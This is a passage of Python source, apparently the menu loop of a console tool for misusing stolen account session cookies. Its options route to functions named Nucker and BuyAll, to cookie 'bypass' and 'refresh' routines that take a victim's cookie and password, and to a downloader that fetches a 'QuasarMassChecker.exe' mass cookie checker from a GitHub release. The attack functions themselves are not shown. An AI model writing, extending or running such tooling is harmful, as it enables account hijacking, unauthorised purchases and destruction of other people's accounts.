        ctypes.windll.kernel32.SetConsoleTitleW("Nucker")
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        Nucker()
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
         
    elif Number == 9:
        ctypes.windll.kernel32.SetConsoleTitleW("Buy all")
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        BuyAll()
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
         
    elif Number == 10:
        Write.Print("Waiting for open file...\n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        YesNo = Write.Input("Do you want to download QuasarChecker? (y/n): ", Colors.red, interval=0.0025)
        YesNo.lower()
        if YesNo == "y":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            link = f"https://github.com/{github}/CookieChecker/releases/download/1.21/QuasarMassChecker.exe"
            
            current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
            download_file(link, os.path.join(current_dir+"\quasarmasscookiechecker", "QuasarMassChecker.exe"))
            Printing = Colorate.Vertical(Colors.red_to_yellow, Center.XCenter(f"Downloaded successfully in {current_dir}\quasarmasscookiechecker\QuasarMassChecker.exe. \n Quick tutrial:\n\nFor our cookie checker to work correctly, you need to create a file cookies.txt in the same folder where the cookie checker is saved ({current_dir+"\quasarmasscookiechecker"}). \n\n cookies go each on a new line: cookie1\ncookie2\ncookie3\n\n\n\nCOPYRIGHT 2025 JEALLEAL (QUASAR INC)"), 1)  
            print(Printing)
            os.system("pause")
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()
        elif YesNo == "n":
            Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()
        else:
            Write.Input("Invalid. Press any key", Colors.purple_to_blue, interval=0.0025) # сам ты инвалид
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()
        
    elif Number == 12:
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
        Write.Print(bypass(cooke, "Age"), Colors.purple_to_blue, interval=0.0025)
        Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == 13:
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print(getBanner())
        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
        Write.Print(bypass(cooke, "RemoveAll"), Colors.purple_to_blue, interval=0.0025)
        Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()

    elif Number == 11:
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print(getBanner())
        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
        parol = Write.Input(f"Cookie password: ", Colors.purple_to_blue, interval=0.0025)
        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
        Write.Print(bypass(cooke, "18+", parol), Colors.purple_to_blue, interval=0.0025)
        Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == 15:
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print(getBanner())
        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
        parol = Write.Input(f"Cookie password: ", Colors.purple_to_blue, interval=0.0025)
        Write.Print("Bypassing (1-5 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
        Write.Print(bypass(cooke, "AllAges", parol), Colors.purple_to_blue, interval=0.0025)
        Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == 14:
        ctypes.windll.kernel32.SetConsoleTitleW("Refresh")
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print(getBanner())
        Write.Print("""
        [1] Ticket Method
        [2] Website Method\n""", Colors.purple_to_blue, interval=0.0025)
        m = Write.Input(f"Select method: ", Colors.purple_to_blue, interval=0.0025)
        if int(m) == 1:
            cooke = Write.Input(f"Cookie to refresh: ", Colors.purple_to_blue, interval=0.0025)
            Write.Print("Refreshing (1-2 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
            Write.Print(cookie_refresh(cooke), Colors.purple_to_blue, interval=0.0025)
            Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)

            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()
        elif int(m) == 2:
            cooke = Write.Input(f"Cookie to refresh: ", Colors.purple_to_blue, interval=0.0025)
            Write.Print("Refreshing (1-2 minutes)... \n", Colors.purple_to_blue, interval=0.0025)
            Write.Print(bypass(cooke, "Refresh"), Colors.purple_to_blue, interval=0.0025)
            Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)

            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()
        else:
            Write.Print("Invalid Choose \n", Colors.purple_to_blue, interval=0.0025)
            Write.Input("\n\nPress any key", Colors.purple_to_blue, interval=0.0025)

            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()
    elif Number <=15:
        Write.Input("This feature is disabled or was not implemented in the code. Press any key", Colors.purple_to_blue, interval=0.0025)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()

    else:
        Write.Input("Invalid number. Press any key", Colors.purple_to_blue, interval=0.0025)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()




check_version(version)
